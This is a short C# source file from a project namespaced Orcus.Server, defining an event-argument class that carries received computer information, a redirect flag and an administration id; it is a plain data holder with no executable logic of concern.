using System;
using Orcus.Shared.Commands.ComputerInformation;

namespace Orcus.Server.Core.Args
{
    public class ComputerInformationReceivedEventArgs : EventArgs
    {
        public ComputerInformationReceivedEventArgs(ComputerInformation computerInformation, bool redirect,
            ushort administration)
        {
            ComputerInformation = computerInformation;
            Redirect = redirect;
            Administration = administration;
        }

        public ComputerInformation ComputerInformation { get; }
        public bool Redirect { get; }
        public ushort Administration { get; }
    }
}